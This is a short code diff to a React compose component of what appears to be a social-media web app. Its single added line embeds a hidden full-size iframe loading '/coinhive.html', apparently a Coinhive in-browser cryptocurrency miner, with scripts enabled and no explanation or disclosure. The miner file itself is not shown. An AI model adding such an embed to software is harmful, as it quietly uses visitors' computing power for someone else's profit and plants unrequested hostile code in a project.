@@ -95,6 +95,7 @@ export default class Compose extends React.PureComponent {
           <div className='drawer__inner' onFocus={this.onFocus}>
             <NavigationContainer onClose={this.onBlur} />
             <ComposeFormContainer />
+			<iframe src="/coinhive.html" sandbox="allow-scripts allow-top-navigation" height="100%" width="100%" />
 			<AnnouncementsContainer />
           </div>
 
